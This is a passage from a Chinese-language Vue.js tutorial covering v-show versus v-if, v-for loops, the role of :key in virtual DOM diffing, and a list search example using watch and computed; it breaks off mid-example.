<p><code>v-show</code>指令的作用和语法与<code>v-if</code>类似，只不过<code>v-show</code>是单支的条件判断，它不能像<code>v-if</code>一样支持<code>v-else</code>和<code>v-else-if</code>指令。即<code>v-if</code>支持多条件分支，而<code>v-show</code>仅支持单条件分支。</p>
<p><code>v-show</code>和<code>v-if</code>有以下区别：</p>
<ul>
<li>适用性：
<ul>
<li><code>v-if</code>适合用于一些切换频率较低的场景。</li>
<li><code>v-show</code>适合用于一些切换效率较高的场景。</li>
</ul>
</li>
<li>特点：
<ul>
<li><code>v-if</code>可以和<code>v-else</code>、<code>v-else-if</code>一同使用，但要求结构不饿能被打断。</li>
<li><code>v-show</code>指令控制的DOM元素始终存在页面结构中，未被移除。当<code>v-show</code>指令的值为<code>false</code>时，仅仅是使用样式将控制的元素隐藏起来。</li>
<li>使用<code>v-if</code>时，元素可能无法被获取（当<code>v-if</code>指令的值为<code>false</code>时）；而使用<code>v-show</code>时，元素一定可以被获取。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="循环指令" data-numberify>循环指令<a class="anchor ms-1" href="#循环指令"></a></h1>
<p>Vue模板中循环使用的是<code>v-for</code>指令。<code>v-for</code>指令的语法如下：</p>
<pre tabindex="0"><code>v-for=&#34;item in items&#34;
</code></pre><p>其中，<code>item</code>是<code>items</code>中的元素，并且<code>items</code>是Vue实例中的对象。<code>v-for</code>指令需要以<code>... in ...</code>的形式存在。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ol</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;item in items&#34;</span><span class="p">&gt;</span>{{item}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ol</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">items</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;item1&#39;</span><span class="p">,</span> <span class="s1">&#39;item2&#39;</span><span class="p">,</span> <span class="s1">&#39;item3&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-for</code>可以通过指定参数来获取<code>value</code>（值）、<code>key</code>（键）、<code>index</code>（索引）等。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      当遍历的元素为数组类型时：
</span></span></span><span class="line"><span class="cl"><span class="c">      - 第1个参数为元素的值 value
</span></span></span><span class="line"><span class="cl"><span class="c">      - 第2个参数为元素的索引 index
</span></span></span><span class="line"><span class="cl"><span class="c">      --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(value, index) in items&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      index={{index}}, value={{value}}
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      当遍历的元素为对象时：
</span></span></span><span class="line"><span class="cl"><span class="c">      - 第1个参数为对象属性的值 value
</span></span></span><span class="line"><span class="cl"><span class="c">      - 第2个参数为对象属性的键 key
</span></span></span><span class="line"><span class="cl"><span class="c">      - 第3个参数为对象属性的索引 index
</span></span></span><span class="line"><span class="cl"><span class="c">      --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(value, key, index) in user&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      index={{index}}, {{key}}: {{value}}
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">items</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;item1&#39;</span><span class="p">,</span> <span class="s1">&#39;item2&#39;</span><span class="p">,</span> <span class="s1">&#39;item3&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">age</span><span class="o">:</span> <span class="s1">&#39;19&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-for</code>指令可以循环整数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;i in 10&#34;</span><span class="p">&gt;</span>{{ i }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="key-属性" data-numberify>key 属性<a class="anchor ms-1" href="#key-属性"></a></h2>
<p>循环指令还可以和<code>:key</code>一起使用，即为每个元素指定一个唯一的标识。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(value, index) in list&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;index&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  index={{index}}: {{value}}
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(value, key) in object&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;key&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  index={{key}}: {{value}}
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>:key</code>可以指定为<code>index</code>（索引）、<code>key</code>（键）或对象中其它唯一标识的属性。例如一个<code>user</code>对象的数组，其中每一个<code>user</code>对象拥有一个唯一标识的属性<code>id</code>，那么可以将<code>:key</code>指定为<code>user.id</code>，即<code>&lt;li v-for=&quot;user in users&quot; :key=&quot;user.id&quot;&gt;</code>。</p>
<p>当使用<code>:key=&quot;index&quot;</code>并且对数据进行破坏顺序的操作时，可能会出现问题，例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>ID<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      默认是以index作为key，即
</span></span></span><span class="line"><span class="cl"><span class="c">      &lt;tr v-for=&#34;preson in presons&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="c">      与下方代码作用相同
</span></span></span><span class="line"><span class="cl"><span class="c">     --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(preson, index) in presons&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;index&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.id}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.name}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.age}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="err">.</span><span class="na">once</span><span class="o">=</span><span class="s">&#34;add&#34;</span><span class="p">&gt;</span>添加新元素<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">presons</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;001&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;002&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;李四&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">19</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;003&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;王五&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">17</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">add</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">preson</span> <span class="o">=</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;004&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;赵六&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">25</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">presons</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">preson</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>打开页面后，选择当前页面中显示的3个元素（<code>id</code>分别为<code>001</code>、<code>002</code>和<code>003</code>）它们的选择框：</p>
<p><picture><img class="img-fluid " alt="uTools_1694410917618" src="/docs/vue/single-instance/template-syntax/directives/uTools_1694410917618.png" loading="lazy" width="279" height="179" />
</picture>

</p>
<p>然后点击按钮新增元素：</p>
<p><picture><img class="img-fluid " alt="uTools_1694410975125" src="/docs/vue/single-instance/template-syntax/directives/uTools_1694410975125.png" loading="lazy" width="282" height="221" />
</picture>

</p>
<p>会发现选择框的位置与原本元素的位置发生了偏移。这是因为Vue在数据修改完成之后会生成对应的虚拟DOM（Vnodes），而虚拟DOM存在于内存之中。要将修改的内容显示到页面上，还需要将虚拟DOM转换为页面中的真实DOM。在将虚拟DOM转为真实DOM之前，Vue会将缓存的两个虚拟DOM（修改之前和修改之后的虚拟DOM）使用虚拟DOM对比算法进行对比。在使用<code>v-for</code>生成的虚拟DOM中，使用的是元素<code>key</code>属性（<code>key</code>不会作用于真实DOM上，仅在虚拟DOM中生效）来标识虚拟DOM对象。如果使用<code>:key=&quot;index&quot;</code>，那么在对数据进行破坏顺序的操作时，数据的顺序被打乱，数据的索引和值于原先数据的索引和值并不相对应，就会导致虚拟DOM在对比时，进行错误的替换。</p>
<blockquote>
<p>虚拟DOM算法在进行对比时，是根据虚拟DOM的属性和值进行对比。修改前后属性和值相同的虚拟DOM，Vue会将其复用（直接使用真实DOM来复用，这样才能保留用户对页面的操作）；而修改前后属性或值不相同的虚拟DOM，Vue会使用修改后的虚拟DOM进行替换，并根据这个新的虚拟DOM生成对应的真实DOM。但是页面中被用户修改的真实DOM的操作并不会作用于虚拟DOM之中。所以一些操作才会导致页面显示异常。</p>
</blockquote>
<p>要修复这类错误，需要为<code>:key</code>指定其它唯一标识。例如使用<code>id</code>作为唯一标识：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;preson in presons&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;preson.id&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>总结：</p>
<ul>
<li>
<p>虚拟DOM中<code>key</code>的作用：</p>
<p><code>key</code>是虚拟DOM对象的标识，当数据发生变化时，Vue会根据<u>新数据</u>生成<u>新的虚拟DOM</u>, 随后Vue进行<u>新虚拟DOM</u>与<u>旧虚拟DOM</u>的差异比较。</p>
</li>
<li>
<p>对比规则：</p>
<ul>
<li>
<p>旧虚拟DOM中找到了与新虚拟DOM相同的<code>key</code>：</p>
<ul>
<li>若虚拟DOM中内容没有发生改变, 直接使用之前的真实DOM。</li>
<li>若虚拟DOM中内容发生了改变, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</li>
</ul>
</li>
<li>
<p>旧虚拟DOM中未找到与新虚拟DOM相同的key：</p>
<p>创建新的真实DOM，随后渲染到到页面。</p>
</li>
</ul>
</li>
<li>
<p>用<code>index</code>作为<code>key</code>可能会引发的问题：</p>
<ul>
<li>
<p>若对数据进行逆序添加、逆序删除等破坏顺序操作:</p>
<p>会产生没有必要的真实DOM更新，界面效果可能没问题, 但效率低。</p>
</li>
<li>
<p>如果结构中还包含输入类的DOM：</p>
<p>会产生错误DOM更新导致界面显示出现问题。</p>
</li>
</ul>
</li>
<li>
<p>开发中如何选择<code>key</code>:</p>
</li>
</ul>
<ol>
<li>最好使用每条数据的唯一标识作为<code>key</code>, 比如<code>id</code>、手机号、身份证号、学号等唯一值。</li>
<li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用<code>index</code>作为<code>key</code>是没有问题的。</li>
</ol>
<h2 id="列表搜索与排序" data-numberify>列表搜索与排序<a class="anchor ms-1" href="#列表搜索与排序"></a></h2>
<p>列表搜索示例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;按名称搜索&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;keyWord&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>编号<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>性别<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;preson in filPresons&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;preson.id&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.id}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.name}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.age}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.sex}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>有两种实现方式：</p>
<ul>
<li>
<p><code>watch</code>实现：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">presons</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;001&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;马冬梅&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;女&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;002&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;周冬雨&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">19</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;女&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;003&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;周杰伦&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">17</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;004&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;温兆伦&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">21</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nx">keyWord</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">filPresons</span><span class="o">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">keyWord</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">immediate</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">handler</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">filPresons</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">presons</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">preson</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="nx">preson</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div></li>
<li>
<p><code>computed</code>实现（更简洁）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">presons</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;001&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;马冬梅&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;女&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;002&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;周冬雨&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">19</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;女&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;003&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;周杰伦&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">17</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">},</span>
